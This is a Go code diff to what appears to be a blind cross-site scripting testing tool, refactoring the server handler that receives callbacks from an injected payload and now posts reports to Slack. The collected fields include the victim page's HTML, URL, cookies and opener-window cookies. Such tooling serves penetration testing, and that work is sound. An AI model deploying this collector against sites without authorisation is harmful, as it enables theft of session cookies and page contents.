@@ -8,18 +8,21 @@ import (
 	"net/url"
 	"strings"
 
+	"github.com/cosmoscrew/thewidow/outputs"
 	"github.com/sirupsen/logrus"
 )
 
 // BlindXSS strucutre holds payloads and other required stuff
 type BlindXSS struct {
 	Payload string
+	Outputs *outputs.Outputs
 }
 
 // New registers required endpoints for blind-xss testing
-func New(mux *http.ServeMux, host string) *BlindXSS {
+func New(mux *http.ServeMux, host string, output *outputs.Outputs) *BlindXSS {
 	b := &BlindXSS{
 		Payload: strings.Replace(Payload, "{{host}}", host, -1),
+		Outputs: output,
 	}
 	mux.HandleFunc("/m", b.Handler)
 
@@ -37,34 +40,33 @@ func (b *BlindXSS) Handler(w http.ResponseWriter, r *http.Request) {
 			logrus.WithError(err).Warning("Could not read body")
 			return
 		}
+		r.Body.Close()
 
 		body := string(data)
+		go b.ProcessRequest(body, r.RemoteAddr)
+	}
+}
 
-		q, err := url.ParseQuery(body)
+// ProcessRequest processes a single blind-xss request
+func (b *BlindXSS) ProcessRequest(body string, RemoteAddr string) {
+	q, err := url.ParseQuery(body)
+	if err != nil {
+		logrus.WithError(err).Warning("Could not parse query")
+		return
+	}
+
+	values := make(map[string]string)
+	for key := range q {
+		dataDecoded, err := url.QueryUnescape(q.Get(key))
 		if err != nil {
-			logrus.WithError(err).Warning("Could not parse query")
+			logrus.WithError(err).Warning("Could not decode form field")
 			return
 		}
-
-		values := make(map[string]string)
-		for key := range q {
-			dataDecoded, err := url.QueryUnescape(q.Get(key))
-			if err != nil {
-				logrus.WithError(err).Warning("Could not decode form field")
-				return
-			}
-
-			values[key] = dataDecoded
-		}
-
-		logrus.WithFields(logrus.Fields{
-			"innerHTML":    values["inne"],
-			"url":          values["durl"],
-			"cookie":       values["dcoo"],
-			"openerCookie": values["odoc"],
-			"openerUrl":    values["oloc"],
-			"openerHtml":   values["oloh"],
-			"IP":           r.RemoteAddr,
-		}).Info("Blind XSS attempt Recieved")
+		values[key] = dataDecoded
 	}
+	values["ip"] = RemoteAddr
+
+	message := NewReport(values)
+	message.Print()
+	b.Outputs.SendNotificationToSlack(message.Slack())
 }
